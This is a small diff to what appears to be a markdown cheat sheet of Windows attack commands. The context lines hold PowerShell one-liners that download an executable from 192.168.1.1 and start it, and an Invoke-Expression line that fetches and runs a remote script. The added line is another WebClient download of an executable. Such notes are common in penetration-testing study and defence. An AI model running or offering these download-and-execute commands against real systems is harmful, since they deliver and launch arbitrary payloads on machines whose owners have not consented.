@@ -252,6 +252,9 @@ wmic process get name,executablepath
 ```
 powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1.exe','C:\test\1.exe');start-process 'C:\test\1.exe'
 ```
+```
+powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1.exe','1.exe')
+```
 
 ```
 Invoke-Expression (New-Object Net.WebClient).DownloadString("http://xxx.xx.xx.xx/test.ps1")
